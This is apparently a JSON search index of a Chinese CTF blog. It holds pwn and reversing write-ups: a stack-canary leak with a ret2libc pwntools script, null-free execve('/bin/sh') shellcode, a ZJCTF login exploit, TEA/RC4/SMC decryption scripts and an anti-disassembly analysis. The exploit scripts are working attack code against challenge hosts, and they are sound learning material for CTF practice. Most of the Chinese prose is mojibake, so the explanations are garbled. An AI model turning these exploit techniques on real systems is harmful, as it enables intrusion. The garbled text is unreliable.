[{"title":"[2021 é¹¤åŸæ¯]littleof","url":"/2025/07/31/2021-%E9%B9%A4%E5%9F%8E%E6%9D%AF-littleof/","content":"é¢˜ç›®\n\nå¼€å¯äº†canaryä¿æŠ¤\næ‰€ä»¥ç”¨printfæ³„éœ²canaryçš„æ•°å€¼\nä¹‹åç”¨ret2libcçš„æ–¹æ³•è§£å†³\nè„šæœ¬from pwn import *from LibcSearcher import *context.log_level = &#x27;debug&#x27;#p = process(&#x27;./littleof&#x27;)p = remote(&#x27;node4.anna.nssctf.cn&#x27;, 28230)elf = ELF(&quot;./littleof&quot;)# canaryæ³„éœ²payload1 = b&#x27;a&#x27; * (0x50 - 0x8) + b&#x27;b&#x27;p.recvuntil(b&#x27;Do you know how to do buffer overflow?\\n&#x27;)p.send(payload1)p.recvuntil(b&#x27;b&#x27;)canary = u64(p.recv(7).rjust(8, b&#x27;\\00&#x27;))print(f&quot;canary :&#123;hex(canary)&#125;&quot;)# ret2libcrdi = 0x400863ret = 0x40059eputs_plt = elf.plt[&#x27;puts&#x27;]puts_got = elf.got[&#x27;puts&#x27;]main = 0x400789payload2 = b&#x27;a&#x27; *0x48 + p64(canary)payload2+= p64(0) + p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(main)p.sendline(payload2)p.recvuntil(b&#x27;I hope you win\\n&#x27;)puts_addr = u64(p.recvuntil(b&#x27;\\n&#x27;)[:-1].ljust(8, b&#x27;\\00&#x27;))print(f&quot;puts_addr: &#123;hex(puts_addr)&#125;&quot;)libc = LibcSearcher(&#x27;puts&#x27;, puts_addr)libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)system_addr = libc_base + libc.dump(&#x27;system&#x27;)bin_sh = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)#gdb.attach(p,&quot;b *0x0000000000400787&quot;)payload3 = b&#x27;a&#x27; * (0x50 - 0x8) + p64(canary) + p64(0)payload3+=p64(ret)+ p64(rdi) + p64(bin_sh) + p64(system_addr)p.sendline(payload3)p.interactive()\n\ncanary = u64(p.recv(7).rjust(8, b&#x27;\\00&#x27;))\n\næ­¤æ—¶è¯»å–çš„è¿˜æ˜¯å°ç«¯åºã€‚æ‰€ä»¥åœ¨å·¦ä¾§è¡¥ä½\\x00\næ”¶è·canaryæ¥æ”¶å‡è®¾æˆ‘ä»¬ç°åœ¨è¦æ³„éœ²çš„ Canary å€¼æ˜¯ 0x1122334455667700ã€‚\næ­¥éª¤ä¸€ï¼šå†…å­˜ä¸­çš„åŸå§‹çŠ¶æ€\nåœ¨ç¨‹åºè¿è¡Œçš„å†…å­˜ä¸­ï¼Œè¿™ä¸ª Canary å€¼ä»¥å°ç«¯åºå­˜å‚¨ã€‚è¿™æ„å‘³ç€å®ƒçš„å­—èŠ‚é¡ºåºæ˜¯åè¿‡æ¥çš„ã€‚\nå†…å­˜åœ°å€ (ä½) -&gt; Canary å­—èŠ‚åº (é«˜)         \\x00\\x77\\x66\\x55\\x44\\x33\\x22\\x11 ï¼ŒCanary çš„æœ€ä½å­—èŠ‚æ˜¯ \\x00ï¼Œå­˜å‚¨åœ¨æœ€ä½åœ°å€ã€‚\næ­¥éª¤äºŒï¼šæ„é€ å¹¶å‘é€ç¬¬ä¸€ä¸ª Payload (æ³„éœ²)\næˆ‘ä»¬æ„é€  Payloadï¼šbâ€™aâ€™ * 0x48 + bâ€™bâ€™ã€‚\nç¨‹åºæ¥æ”¶åï¼Œç¼“å†²åŒºè¢«å¡«æ»¡ï¼Œbâ€™bâ€™ è¦†ç›–äº† Canary çš„æœ€ä½å­—èŠ‚ \\x00ã€‚\nç°åœ¨ï¼Œå†…å­˜ä¸­çš„ Canary å˜æˆäº†ï¼š \\x62\\x77\\x66\\x55\\x44\\x33\\x22\\x11ï¼Œ\\x62 æ˜¯å­—ç¬¦ â€˜bâ€™ çš„åå…­è¿›åˆ¶å€¼ã€‚\næ­¥éª¤ä¸‰ï¼šç¨‹åºè¾“å‡ºæ³„éœ²çš„æ•°æ®\nç¨‹åºä½¿ç”¨ printf(â€œ%sâ€, buf) è¿™æ ·çš„æ–¹å¼å°†æ ˆä¸Šçš„æ•°æ®å½“æˆå­—ç¬¦ä¸²è¾“å‡ºã€‚å®ƒä¼šä» buf å¼€å§‹å‘åæ‰“å°ï¼Œç›´åˆ°é‡åˆ°ç¬¬ä¸€ä¸ªç©ºå­—èŠ‚ \\x00ã€‚\nç”±äºæˆ‘ä»¬ç”¨ b è¦†ç›–äº† Canary çš„æœ€ä½å­—èŠ‚ï¼Œprintf ä¸ä¼šåœ¨è¿™é‡Œåœæ­¢ï¼Œè€Œæ˜¯ç»§ç»­å‘åæ‰“å°ã€‚\nå®ƒä¼šæ‰“å°å‡º b åŠ ä¸Š Canary å‰©ä¸‹çš„ 7 ä¸ªå­—èŠ‚ï¼š\\x62\\x77\\x66\\x55\\x44\\x33\\x22\\x11\næ­¥éª¤å››ï¼šè„šæœ¬æ¥æ”¶å¹¶å¤„ç†æ³„éœ²æ•°æ®\næˆ‘ä»¬çš„ Python è„šæœ¬æ‰§è¡Œ p.recvuntil(bâ€™bâ€™)ï¼Œå…ˆæ¥æ”¶åˆ° bï¼Œç„¶åæ‰§è¡Œ p.recv(7)ï¼Œæ¥æ”¶å‰©ä¸‹çš„ 7 ä¸ªå­—èŠ‚\\x77\\x66\\x55\\x44\\x33\\x22\\x11\næ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬ç”¨ rjust(8, bâ€™\\x00â€™) æ¥æ¢å¤ Canaryï¼Œå°±canaryçš„å°ç«¯åºæƒ…å†µæ¥çœ‹ï¼Œåœ¨æ•°æ®å·¦ä¾§æ·»ä¸€ä¸ªâ€\\x00â€,æ‰€ä»¥è¦ç”¨rjustï¼ˆæŠŠç°æœ‰æ•°æ®æ”¾å³è¾¹ï¼‰\næœ€åï¼Œæˆ‘ä»¬ç”¨ u64() å°†è¿™ä¸ªå®Œæ•´çš„ 8 å­—èŠ‚å°ç«¯åºæ•°æ®è½¬æ¢å›ä¸€ä¸ªæ•´æ•°ï¼š\ncanary &#x3D; u64(bâ€™\\x00\\x77\\x66\\x55\\x44\\x33\\x22\\x11â€™)ç»“æœå°±æ˜¯ï¼š0x1122334455667700\nè‡³æ­¤ï¼ŒCanary æ³„éœ²å®Œæˆã€‚\nå°ç«¯åºleaked = p.recv(8)           # æ”¶åˆ° 8 å­—èŠ‚ï¼šb&#x27;\\x00\\x12\\x34\\x56\\x78\\x9a\\xbc\\xde&#x27;value = u64(leaked)          # â†’ 0xdebc9a7856341200\n\ntarget_addr = 0x401123p.send(p64(target_addr))     # â†’ å‘é€ b&#x27;\\x23\\x11\\x40\\x00\\x00\\x00\\x00\\x00&#x27;\n\n\n\n\n\n\n\n\n\n\n\n\nä»å†…å­˜è¯»æ•´æ•°ï¼ˆcanaryã€åœ°å€ï¼‰\nâœ… æ˜¯\nç”¨u32&#x2F;u64\n\n\nå‘å†…å­˜å†™æ•´æ•°ï¼ˆROPã€æº¢å‡ºï¼‰\nâœ… æ˜¯\nç”¨p32&#x2F;p64\n\n\nå­—ç¬¦ä¸²ï¼ˆâ€helloâ€ï¼‰\nâŒ å¦\næŒ‰æ­£å¸¸é¡ºåº\n\n\nç½‘ç»œåè®®\nâŒ å¦ï¼ˆç”¨å¤§ç«¯ï¼‰\nç”¨&gt;I,&gt;Q\n\n\næ–‡ä»¶æ ¼å¼ï¼ˆELFã€PNGï¼‰\nâŒ å¦\næŒ‰å­—èŠ‚æµé¡ºåº\n\n\næ ¼å¼åŒ–å­—ç¬¦ä¸²è¾“å‡ºï¼ˆ%pï¼‰\nâŒ å¦\nç›´æ¥è½¬æ•´æ•°\n\n\næ³„éœ²çš„ hex å­—ç¬¦ä¸²ï¼ˆå¦‚ â€œaabbccddâ€ï¼‰\nâŒ å¦\nå…ˆbytes.fromhex()å†çœ‹æ˜¯å¦è¦åè½¬\n\n\n\n","categories":["exercise_pwn"],"tags":["Canaryç»•è¿‡","å°ç«¯åº","PWN"]},{"title":"[HDCTF 2023]enc","url":"/2025/07/11/HDCTF-2023-enc/","content":"é“¾æ¥\næ‰“å¼€è¿›å…¥è¿™ä¸ªå‡½æ•°\n\nTEA\nåˆ†æä¹‹åçŸ¥é“\nä¸‹ä¸€æ­¥æ ¸å¯¹çš„v7å’Œv8éƒ½æ˜¯æ”¹å˜åçš„å¯†æ–‡\nv9æ‰æ˜¯å¯†é’¥\nè§£å¯†æ—¶æ³¨æ„ï¼Œå¼‚æˆ–çš„æ—¶å€™ä»åå¾€å‰å¼‚æˆ–ï¼Œå€’ç€æ¥\nè„šæœ¬\n#teaè§£å¯†def tea_decrypt(v, k):    v0, v1 = v[0], v[1]    delta = 0x61C88647    sum = -(delta * 32) &amp; 0xFFFFFFFF    for _ in range(32):        v1 = (v1 - ((16*v0 + k[2]) ^ (v0 + sum) ^((v0 &gt;&gt;5) + k[3]))) &amp; 0xFFFFFFFF        v0 = (v0 - ((16*v1+ k[0]) ^ (v1 + sum) ^((v1 &gt;&gt;5) + k[1]))) &amp; 0xFFFFFFFF         sum = (sum + delta) &amp; 0xFFFFFFFF    return [v0, v1] # ç»™å®šå¯†æ–‡v9å’Œå¯†é’¥v10v9 = [0x60fcdef7,0x236dbec]v10 = [0x12,0x34,0x56,0x78]print(tea_decrypt(v9, v10))//key=3\n\nSMCç»§ç»­çœ‹ä¸‹é¢çš„å‡½æ•°\nsub_4113DE â€”&gt;sub_414C10â€”&gt;sub_411046â€”&gt;sub_414B00â€”&gt;sub_411221â€”&gt;sub_415340\n\n\n(char *)a1 æˆ– (_BYTE *)a1 æ˜¯å°†æ•´æ•°åœ°å€ a1 è½¬æ¢ä¸ºå†…å­˜æŒ‡é’ˆã€‚\nç„¶åé€šè¿‡ *ptr ^= a3 ä¿®æ”¹è¯¥åœ°å€ä¸Šçš„å†…å®¹ã€‚\n\næ‰€ä»¥æ˜¯SMC\né‚£ä¸‹ä¸€æ­¥å°±æ˜¯æ‰¾åˆ°å®ƒæ”¹å˜çš„åœ°å€çš„èŒƒå›´\næ‰“å¼€x32xdbg\nctrl+gè¾“å…¥00415340\n\nF9è¿è¡Œåä¼šåœåœ¨è¿™é‡Œ\n\n\næ‰€ä»¥ä¿®æ”¹ä½ç½®çš„ä½ç½®å¤´æ˜¯0x0041D000\né•¿åº¦æ˜¯0x600\næ‰€ä»¥åœ¨idaä¸­è¿è¡Œè„šæœ¬\nè„šæœ¬\n# å¯¼å…¥ ida_bytes æ¨¡å—ï¼Œè¿™æ˜¯ç°ä»£ IDA Python æ¨èçš„å­—èŠ‚æ“ä½œæ–¹å¼from ida_bytes import get_byte, patch_byte # å®šä¹‰æ“ä½œçš„èµ·å§‹åœ°å€ã€ç»“æŸåœ°å€å’Œå¼‚æˆ–å¯†é’¥start_address = 0x41d000end_address = 0x41E600 # rangeå‡½æ•°ä¸åŒ…å«end_addressxor_key = 3 print(&quot;å¼€å§‹æ‰¹é‡å¼‚æˆ–ä¿®æ”¹...&quot;)# éå†æŒ‡å®šèŒƒå›´å†…çš„æ¯ä¸ªå­—èŠ‚å¹¶è¿›è¡Œå¼‚æˆ–æ“ä½œfor i in range(start_address, end_address):    original_byte = get_byte(i)      # ä½¿ç”¨ get_byte ä» ida_bytes æ¨¡å—è¯»å–å­—èŠ‚    new_byte = original_byte ^ xor_key    patch_byte(i, new_byte)          # ä½¿ç”¨ patch_byte ä» ida_bytes æ¨¡å—å†™å…¥å­—èŠ‚print(&quot;ä¿®æ”¹å®Œæˆ&quot;)\n\nä¹‹åå†åœ¨å‡½æ•°å¤´æŒ‰Uç»“æ„\nå†é€‰ä¸­èŒƒå›´å»C\n\nå°±å¯ä»¥äº†\n\n\nå‘ç°æ˜¯RC4åŠ å¯†\nè„šæœ¬\nkey=list(&#x27;you_are_master&#x27;)content=[0xf,0x94,0xae,0xf2,0xc0,0x57,0xc2,0xe0,0x9a,0x45,0x37,0x50,0xf5,0xa0,0x5e,0xcb,0x2c,0x16,0x28,0x29,0xfe,0xff,0x33,0x46,0xe,0x57,0x82,0x22,0x52,0x26,0x2b,0x6e,0xe4,0x82,0x24]rc4number=0x100s=[0]*rc4numberflag=&#x27;&#x27;  def rc4_init(s,key,rc4number):    for i in range(rc4number):        s[i]=i    j=0    for i in range(rc4number):        j=(j+s[i]+ord(key[i%len(key)]))%rc4number        temp=s[i]        s[i]=s[j]        s[j]=temp def rc4_endecode(s,content,rc4number):    i=0    j=0    for k in range(len(content)):        i=(i+1)%rc4number        j=(j+s[i])%rc4number        temp=s[i]        s[i]=s[j]        s[j]=temp        t=(s[i]+s[j])%rc4number        content[k]=chr(content[k]^s[t])    content=&#x27;&#x27;.join(content)    print(content)  rc4_init(s,key,rc4number)rc4_endecode(s,content,rc4number)\n\n","categories":["exercise_re"],"tags":["RE","TEA","SMC"]},{"title":"NewStar2024 pwn","url":"/2025/08/15/NewStar2024-pwn/","content":"week2Bad Asm\næ‰€ä»¥é€šè¿‡ç¼–å†™æ±‡ç¼–ä»£ç æ¥å†™è¿™æ®µshellcode\né€šè¿‡å¼‚æˆ–ç­‰æ“ä½œæ¥ç»•è¿‡ä¸èƒ½æœ‰00ä»¥åŠsyscall æˆ– sysenter æŒ‡ä»¤æ±‡ç¼–ç çš„é™åˆ¶\nè„šæœ¬\nfrom pwn import *from Crypto.Util.number import long_to_bytes, bytes_to_longcontext.log_level=&#x27;debug&#x27;context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)context.terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]ELFpath = &#x27;./pwn&#x27;p = remote(&#x27;192.168.137.1&#x27;, 40273)shellcode=&#x27;&#x27;&#x27;; // ç›®æ ‡: æ‰§è¡Œ execve(&quot;/bin/sh&quot;, 0, 0) çš„ syscallmov rsp, rdi  #rspæŒ‡å‘destï¼ˆsellcodeï¼‰çš„å¤´éƒ¨add sp, 0x0848 ; // ç»™ rsp ä¸€ä¸ªåˆæ³•å€¼ï¼Œä½¿ç¨‹åºèƒ½æ­£å¸¸æ‰§è¡Œ push/popï¼Œä»»æ„ä¸€ä¸ªå¯è¯»å†™æ®µå³å¯ï¼Œæˆ‘ä»¬è¿™é‡Œåˆšå¥½æœ‰rdiä¸­å­˜å‚¨çš„ shellcode çš„æ®µçš„èµ·å§‹ä½ç½®ï¼Œæ­£å¥½è¿™ä¸ªæ®µæœ‰è¯»å†™æƒé™ï¼Œå°±ç›´æ¥æ‹¿æ¥åœ¨ 0x848 åç§»çš„ä½ç½®å½“ä½œæ ˆé¡¶äº†ï¼ˆåŠ åç§»æ˜¯ä¸ºäº†é˜²æ­¢æŸäº›æ“ä½œç ´åå†™å…¥çš„ shellcodeï¼‰mov rsi, 0x4028636f2e49226fmov rdx, 0x4040104040204040xor rsi, rdxpush rsi       ; // å¼‚æˆ–æ“å‡ºæ¥&#x27;/bin/sh\\x00&#x27;(æ­£å¥½ 8 å­—èŠ‚ï¼Œä¸€ä¸ªå¯„å­˜å™¨èƒ½å­˜ä¸‹) å¹¶ push åˆ°æ ˆä¸Šé¢ã€‚æ­¤æ—¶ rsp æŒ‡å‘çš„å³æ­¤å­—ç¬¦ä¸²çš„å¼€å§‹ä½ç½® mov ax, 0x454fxor ax, 0x4040mov rsi, rdiadd sil, 0x40mov [rsi], ax  ; // æ“å‡ºæ¥ syscall çš„æœºå™¨ç  0f 05 å¹¶ä¸”æ‹¼æ¥åˆ°å½“å‰ shellcode åé¢ã€‚ mov rdi, rsp   ; // è®¾ç½® rdiï¼ŒæŒ‡å‘ä¹‹å‰ push åˆ°æ ˆä¸Šé¢çš„ &#x27;/bin/sh\\x00&#x27;xor rsi, rsixor rdx, rdx   ; // è®¾ç½® rsi, rdxxor rax, raxmov al, 59     ; // è®¾ç½® execve çš„ç³»ç»Ÿè°ƒç”¨å·&#x27;&#x27;&#x27;p.sendafter(&quot;Input your Code :&quot;, asm(shellcode).ljust(0x40, b&#x27;\\x90&#x27;))p.interactive()\n\n\n\nEz_fmtInverted World\næ­¤æ—¶åˆšæ‰§è¡Œcall readå‡½æ•°ï¼Œå› ä¸ºæ˜¯64ä½çš„ç¨‹åºå‚æ•°æ˜¯é€šè¿‡å¯„å­˜å™¨å‡†å¤‡çš„\nmov rsi, rax\nmov edx, 0x512ç­‰\nè¿™äº›æŒ‡ä»¤æ˜¯åœ¨ call _readä¹‹å‰æ‰§è¡Œï¼Œå®ƒä»¬å°†å‚æ•°å€¼æ”¾å…¥ç›¸åº”çš„å¯„å­˜å™¨ä¸­ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥è¦å‹å…¥readå‡½æ•°çš„è¿”å›åœ°å€\nçœ‹ripçš„åœ°å€ï¼Œåº”ä¸ºè¿™ä¸ªæ˜¯\nè®¡ç®—è·ç¦»åº”è¯¥å¡«å……\n","categories":["WP"],"tags":["PWN","WP"]},{"title":"[ZJCTF 2019]Login","url":"/2025/08/26/ZJCTF-2019-Login/","content":"é¢˜ç›®\n\nå‘ç°ä»£ç æœ‰ç‚¹ä¸å®¹æ˜“åˆ†æï¼Œä½†æ˜¯é¢˜ç›®ä¸­å­˜åœ¨ç›´æ¥çš„åé—¨å‡½æ•°\næ‰€ä»¥é¢˜ç›®åº”è¯¥ä¸éš¾\nåœ¨checkå‡½æ•°ä¸­\n\nçœ‹åˆ°è¿™ä¸ªå‡½æ•°çš„å‚æ•°è¢«æ‰§è¡Œäº†\næ‰€ä»¥æˆ‘ä»¬å¯ä»¥æŠŠè¿™ä¸ªå‚æ•°ç›´æ¥æ›¿æ¢ä¸ºåé—¨å‡½æ•°çš„åœ°å€ï¼ˆç¬¬ä¸€ä¸ªå‚æ•°å­˜åœ¨rdiä¸­ï¼‰\nå› ä¸ºè¿™ä¸ªå‡½æ•°æ˜¯åœ¨mainå‡½æ•°ä¸­è¢«è°ƒç”¨çš„\næˆ‘ä»¬å»mainå‡½æ•°ä¸­æ‰¾åˆ°rdiçš„èµ‹å€¼\n\nlea rax, [rbp+var_130] è¿™æ¡æŒ‡ä»¤çš„æ„æ€å°±æ˜¯ï¼š**è®¡ç®— [rbp+var_130] è¿™ä¸ªå†…å­˜åœ°å€ï¼Œç„¶åæŠŠè¿™ä¸ªåœ°å€æœ¬èº«çš„å€¼èµ‹ç»™ rax å¯„å­˜å™¨ã€‚**ç¬¦åˆæˆ‘ä»¬åé¢çœ‹åˆ°çš„a1æŒ‡é’ˆçš„æƒ…å†µ\nå›¾ä¸­å¯ä»¥çœ‹åˆ°rdiçš„å€¼åº”è¯¥æ˜¯[rbp+var_130]\nä¸”åœ¨password_checkerä¹‹åæŠŠ[rbp+var_130]çš„å€¼èµ‹ç»™rax\næ‰€ä»¥æˆ‘ä»¬å¯ä»¥å»password_checkeræŸ¥çœ‹å…¶ä½ç½®ï¼Œç›®æ ‡å°±æ˜¯æ‰¾åˆ°å®ƒçš„ç›¸å¯¹ä½ç½®\n\nçœ‹åˆ°è·ç¦»retæ˜¯0x18\nmainæ¥ä¸‹æ¥ä¼šè°ƒç”¨read_passwordå‡½æ•°ï¼ˆè¿™ä¸¤ä¸ªéƒ½æ˜¯mainè°ƒç”¨çš„ï¼Œå¯ä»¥æ ¹æ®å…¶ç›¸å½“äºretçš„ä½ç½®å»åˆ¤æ–­å…¶å®é™…ä½ç½®ï¼‰\nä¼šæŠŠæ ˆæ¸…ç©ºï¼Œç„¶åå»ºå®ƒè‡ªå·±çš„çš„æ ˆç©ºé—´\n\nå¯ä»¥çœ‹åˆ°ä»è¯»å…¥ä½ç½®såˆ°æˆ‘ä»¬æ‰§è¡Œçš„å‚æ•°ä½ç½®åç§»æ˜¯0x48\nè„šæœ¬\nfrom pwn import *context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)#p=process(&quot;./login&quot;)elf=ELF(&quot;./login&quot;)#gdb.attach(p,&quot;b*0x400B68&quot;)p=remote(&quot;node5.buuoj.cn&quot;,29403)p.recvuntil(b&quot;username:&quot;)p.sendline(b&quot;admin&quot;)#p.recvuntil(b&quot;password:&quot;)pay=b&quot;2jctf_pa5sw0rd&quot;pay=pay.ljust(0x48,b&quot;\\x00&quot;)pay+=p64(0x400E88)p.sendline(pay)p.interactive()\n\n","categories":["exercise_pwn"],"tags":["PWN","raxæ›¿ä»£"]},{"title":"[HNCTF 2022 WEEK4]flower plus","url":"/2025/07/14/HNCTF-2022-WEEK4-flower-plus/","content":"é“¾æ¥\nèŠ±æŒ‡ä»¤åˆ†æ\nå‘ç°èŠ±æŒ‡ä»¤\ndb 0C7h çš„â€œåƒåœ¾â€ä½œç”¨ï¼š 0x4012A6 å¤„çš„ db 0C7h æ˜¯ä¸€ä¸ªæ•°æ®å­—èŠ‚ã€‚å®ƒè¢« jnz æŒ‡ä»¤è·³è½¬åˆ°ï¼Œä½†å®ƒæœ¬èº«ä¸æ˜¯ä¸€ä¸ªæœ‰æ„ä¹‰çš„æ‰§è¡Œè·¯å¾„ã€‚å®ƒçš„å­˜åœ¨æ˜¯ä¸ºäº†å¹²æ‰°åæ±‡ç¼–å™¨çš„çº¿æ€§åˆ†æï¼Œä½¿å…¶è®¤ä¸ºè¿™é‡Œå­˜åœ¨ä¸€ä¸ªå®é™…çš„ä»£ç åˆ†æ”¯ã€‚åæ±‡ç¼–å™¨å¯èƒ½ä¼šå°† 0C7h è§£ç ä¸º MOV EDI, EBP (å¦‚æœåŠ ä¸Šå‰ç¼€çš„è¯)ï¼Œæˆ–è€…åªæ˜¯ä¸€ä¸ªæ•°æ®å­—èŠ‚ï¼Œæ— è®ºå“ªç§ï¼Œéƒ½ä¸æ­£å¸¸é€»è¾‘ä¸ç¬¦ã€‚\nä¸ºäº†ä¸å½±å“æ±‡ç¼–å™¨çš„åˆ†æ\nè¦æŠŠè¿™é‡Œè¿›è¡Œåˆ¤æ–­å’Œè·³è½¬çš„éƒ½NOPæ‰\nå°† push ebx å’Œ pop ebx éƒ½ NOP æ‰çš„ä¸»è¦åŸå› æ˜¯ä¸ºäº†å®Œå…¨æ¶ˆé™¤è¿™ä¸ªèŠ±æŒ‡ä»¤çš„å‰¯ä½œç”¨å’Œæ··æ·†é“¾ï¼š\n\næ ˆå¹³è¡¡ï¼š push ebx å’Œ pop ebx æ˜¯ä¸€å¯¹ç”¨æ¥ç»´æŠ¤æ ˆå¹³è¡¡çš„æ“ä½œã€‚å¦‚æœå®ƒä»¬æ˜¯èŠ±æŒ‡ä»¤çš„ä¸€éƒ¨åˆ†ï¼Œå¹¶ä¸”å®ƒä»¬ä¿å­˜&#x2F;æ¢å¤çš„å¯„å­˜å™¨å€¼åœ¨ä¸­é—´è¢«ä¿®æ”¹ï¼ˆä¾‹å¦‚è¢« xor ebx, ebx æ¸…é›¶ï¼‰ï¼Œé‚£ä¹ˆè¿™å¯¹ push/pop å®é™…ä¸Šæ˜¯æ— æ•ˆçš„æˆ–è€…è¯´æ˜¯è¯¯å¯¼æ€§çš„ã€‚å®ƒä»¬çš„å­˜åœ¨åªæ˜¯ä¸ºäº†è®©ä»£ç çœ‹èµ·æ¥æ›´å¤æ‚ï¼Œæˆ–è€…åœ¨æŸäº›æƒ…å†µä¸‹é€šè¿‡ä¸åŒ¹é…çš„æ ˆæ“ä½œæ¥å¹²æ‰°åˆ†æã€‚\n\nå¦‚æœåª NOP æ‰ä¸­é—´çš„è·³è½¬ï¼Œä¿ç•™ push ebx å’Œ pop ebxï¼Œé‚£ä¹ˆåœ¨ push ebx ä¹‹åï¼Œebx ç«‹å³è¢«æ¸…é›¶ï¼Œç„¶ååˆè¢« pop ebx æ¢å¤ã€‚è¿™å¯èƒ½ä¼šå¯¼è‡´ ebx çš„å€¼åœ¨å‡½æ•°ä¸­è¢«ä¸å¿…è¦åœ°æ”¹å˜å’Œæ¢å¤ï¼Œå³ä½¿å®ƒä¸æ˜¯çœŸæ­£éœ€è¦çš„ã€‚\n\n\n\nç¬¬äºŒä¸ªèŠ±æŒ‡ä»¤\n\n\næ‰§è¡Œ 0x401358: call loc_40135E:\ncall æŒ‡ä»¤æœ¬èº«å ç”¨ 5 ä¸ªå­—èŠ‚ (E8 01 00 00 00)ã€‚\ncall æŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€æ˜¯ 0x401358 + 5 = 0x40135Dã€‚\nCPU å°† 0x40135D å‹å…¥æ ˆä¸­ã€‚æ­¤æ—¶ï¼Œ0x40135D å°±æ˜¯æ ˆé¡¶çš„è¿”å›åœ°å€ã€‚\nCPU è·³è½¬åˆ° 0x40135E å¼€å§‹æ‰§è¡Œã€‚\n\n\næ‰§è¡Œ 0x40135E: db 36h:\nè¿™æ˜¯ä¸€ä¸ªæ•°æ®å­—èŠ‚ï¼Œä½†æ˜¯ CPU ä¼šå°è¯•å°†å…¶ä½œä¸ºæŒ‡ä»¤æ‰§è¡Œã€‚è¿™é€šå¸¸æ˜¯èŠ±æŒ‡ä»¤çš„æ··æ·†æ‰‹æ³•ï¼Œå®ƒå¯èƒ½ä¸ä¼šå¯¼è‡´å´©æºƒï¼Œè€Œæ˜¯ä½œä¸ºæ— æ•ˆæŒ‡ä»¤æ‰§è¡Œæˆ–è€…è¢«åç»­æŒ‡ä»¤è¦†ç›–ã€‚\nå‡è®¾å®ƒè¢«æ‰§è¡Œäº†ï¼Œæˆ–è€…è¢«è·³è¿‡äº†ï¼Œç¨‹åºæµä¼šç»§ç»­åˆ° 0x40135Fã€‚\n\n\næ‰§è¡Œ 0x40135F: add dword ptr [esp], 8:\nè¿™æ¡æŒ‡ä»¤éå¸¸å…³é”®ã€‚\n[esp] æŒ‡çš„æ˜¯æ ˆé¡¶çš„å†…å­˜åœ°å€ã€‚å½“å‰æ ˆé¡¶å­˜æ”¾çš„æ˜¯ 0x40135Dï¼ˆåŸå§‹è¿”å›åœ°å€ï¼‰ã€‚\nadd dword ptr [esp], 8 çš„ä½œç”¨æ˜¯ï¼šå°†æ ˆé¡¶å­˜æ”¾çš„é‚£ä¸ª dword å€¼ï¼ˆå³ 0x40135Dï¼‰åŠ ä¸Š 8ï¼Œç„¶åæŠŠç»“æœå†å†™å›æ ˆé¡¶ã€‚\næ‰€ä»¥ï¼Œæ ˆé¡¶çš„è¿”å›åœ°å€ä» 0x40135D å˜æˆäº† 0x40135D + 8 = 0x401365ã€‚\n\n\næ‰§è¡Œ 0x401362: retn:\nretn æŒ‡ä»¤ä¼šä»æ ˆé¡¶å¼¹å‡ºåœ°å€ã€‚\nå®ƒå¼¹å‡ºçš„ä¸å†æ˜¯åŸå§‹çš„ 0x40135Dï¼Œè€Œæ˜¯è¢« add æŒ‡ä»¤ä¿®æ”¹åçš„ 0x401365ã€‚\nCPU è·³è½¬åˆ° 0x401365 å¼€å§‹æ‰§è¡Œã€‚\n\n\n\nåŸå§‹çš„è¿”å›åœ°å€æ˜¯ 0x40135Dã€‚å¦‚æœæ²¡æœ‰ä»»ä½• add æ“ä½œï¼Œretn ä¼šå›åˆ° 0x40135Dã€‚\nä½†æ˜¯ï¼Œadd dword ptr [esp], 8 å°†è¿”å›åœ°å€ä¿®æ”¹æˆäº† 0x401365ã€‚\nè¿™æ„å‘³ç€å½“ retn æ‰§è¡Œæ—¶ï¼Œç¨‹åºä¼šç›´æ¥ä» 0x401365 å¼€å§‹æ‰§è¡Œï¼Œ\næ‰€ä»¥ï¼Œadd dword ptr [esp], 8 çš„ä½œç”¨å°±æ˜¯äººä¸ºåœ°è°ƒæ•´äº† retn çš„ç›®æ ‡åœ°å€ï¼Œä½¿å…¶è·³è¿‡äº† 0x40135D åˆ° 0x401364ï¼ˆåŒ…å« 0x401364ï¼‰è¿™æ®µåŒºåŸŸï¼Œç›´æ¥è·³è½¬åˆ° 0x401365 å»æ‰§è¡Œã€‚ è¿™å°±æ˜¯è¿™ç§èŠ±æŒ‡ä»¤ç”¨äºæ··æ·†æ§åˆ¶æµçš„ä¸€ç§å¸¸è§æ‰‹æ³•ã€‚\næ‰€ä»¥NOPçš„èŒƒå›´åŒ…æ‹¬0x401364\n\nä¸ºä»€ä¹ˆæ˜¯èŠ±æŒ‡ä»¤\næ­£å¸¸æƒ…å†µä¸‹ï¼Œcall æŒ‡ä»¤ä¼šç›´æ¥è·³è½¬åˆ°è¢«è°ƒç”¨å‡½æ•°çš„å…¥å£ç‚¹ã€‚è¿™ä¸ªå…¥å£ç‚¹åº”è¯¥æ˜¯ä¸€æ¡åˆæ³•çš„å¯æ‰§è¡ŒæŒ‡ä»¤ã€‚\nä½†æ˜¯åœ¨è¿™é‡Œï¼Œå½“ call æŒ‡ä»¤è·³è½¬åˆ° 0x40135E æ—¶ï¼Œå®ƒé‡åˆ°çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯ db 36hã€‚\n\nåæ±‡ç¼–å™¨å›°æƒ‘ï¼š é™æ€åæ±‡ç¼–å™¨åœ¨ 0x40135E çœ‹åˆ° db 36h æ—¶ï¼Œé€šå¸¸ä¼šè®¤ä¸ºè¿™æ˜¯æ•°æ®ï¼Œè€Œä¸æ˜¯ä»£ç ã€‚å®ƒå¯èƒ½å› æ­¤åœæ­¢å¯¹è¯¥åŒºåŸŸçš„ä»£ç åˆ†æï¼Œæˆ–è€…äº§ç”Ÿé”™è¯¯çš„è§£ç ã€‚\nCPU è¡Œä¸ºï¼š CPU ä¼šå°è¯•å°† 36h ä½œä¸ºæŒ‡ä»¤æ¥è§£ç æ‰§è¡Œã€‚å¦‚å‰æ‰€è¿°ï¼Œ36h æ˜¯ä¸€ä¸ªæ®µè¶…è¶Šå‰ç¼€ï¼ˆSS:ï¼‰ã€‚CPU 